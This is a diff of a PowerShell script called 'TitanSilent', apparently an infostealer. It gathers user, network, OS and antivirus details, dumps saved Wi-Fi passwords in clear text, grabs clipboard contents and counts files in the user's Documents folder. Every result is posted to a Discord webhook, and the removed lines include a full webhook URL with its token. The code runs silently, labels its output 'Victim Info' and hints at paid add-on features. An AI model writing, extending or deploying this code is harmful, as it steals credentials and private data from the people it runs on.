@@ -1,37 +1,51 @@
-# =====================[ TITAN SILENT MODE ]=======================
+# TitanSilent v2
+$webhook = "https://discord.com/api/webhooks/..."  # 👈 dein Webhook
 $ErrorActionPreference = "SilentlyContinue"
 Add-Type -AssemblyName System.Web
 
-$webhook = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"
-
-function Send-Discord($msg) {
-    $payload = @{content = $msg} | ConvertTo-Json -Depth 3
-    Invoke-RestMethod -Uri $webhook -Method POST -Body $payload -ContentType 'application/json'
+function Send($msg) {
+    $json = @{content = $msg} | ConvertTo-Json -Depth 3
+    Invoke-RestMethod -Uri $webhook -Method POST -Body $json -ContentType 'application/json'
 }
 
-# =====================[ WLAN KEYS ]=======================
-$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
-    ($_ -split ":")[1].Trim()
-}
-$wifiResult = ""
-foreach ($profile in $wifiProfiles) {
-    $keyOutput = netsh wlan show profile name="$profile" key=clear
-    $keyLine = $keyOutput | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
-    $wifiResult += "📶 $profile → 🔑 $keyLine`n"
-}
-Send-Discord "**[WLAN KEYS]**`n$wifiResult"
+# 🧠 USER INFO
+$userInfo = "`n🧠 **User Info**`nUsername: $env:USERNAME`nComputer: $env:COMPUTERNAME`nDomain: $env:USERDOMAIN`nAdmin: $([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
+Send $userInfo
 
-# =====================[ CLIPBOARD ]=======================
+# 🌐 NETWORK
+$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
+$net = Get-NetIPConfiguration | Where-Object { $_.IPv4Address -ne $null }
+$netInfo = "`n🌐 **Network Info**`nPublic IP: $ip`n"
+foreach ($n in $net) {
+    $netInfo += "Adapter: $($n.InterfaceAlias)`nIPv4: $($n.IPv4Address.IPAddress)`nGW: $($n.IPv4DefaultGateway.NextHop)`nDNS: $($n.DnsServer.ServerAddresses -join ', ')`n`n"
+}
+Send $netInfo
+
+# 📡 WLAN KEYS
+$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
+$wifi = "`n📡 **WLAN Keys**`n"
+foreach ($p in $profiles) {
+    $pw = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
+    $wifi += "$p → $pw`n"
+}
+Send $wifi
+
+# 📋 CLIPBOARD
 $clip = Get-Clipboard
-if ($clip -ne "") {
-    Send-Discord "**[Clipboard]**`n$clip"
-}
+if ($clip -ne "") { Send "`n📋 **Clipboard:**`n$clip" }
 
-# =====================[ USER/OS INFO ]=======================
-$u = $env:USERNAME
-$p = $env:COMPUTERNAME
-$os = (Get-CimInstance Win32_OperatingSystem).Caption
-Send-Discord "**[Victim Info]**`n👤 $u`n🖥️ $p`n💿 $os"
+# 💿 OS INFO
+$os = Get-CimInstance Win32_OperatingSystem
+$osInfo = "`n💿 **OS Info**`n$($os.Caption) $($os.OSArchitecture)`nInstall: $($os.InstallDate)`nLast Boot: $($os.LastBootUpTime)`nUser: $($os.RegisteredUser)`nBuild: $($os.BuildNumber)"
+Send $osInfo
 
-# =====================[ END ]=======================
-exit
+# 🔐 AV Info
+$av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntivirusProduct"
+$avList = ($av.displayName -join ", ")
+Send "`n🔐 **Antivirus Detected:**`n$avList"
+
+# 📁 FILE SYSTEM
+$files = Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -ErrorAction SilentlyContinue | Measure-Object
+Send "`n📁 **User Documents:**`n$($files.Count) files detected in Documents folder."
+
+# (Optional Features nach Wunsch zubuchbar)
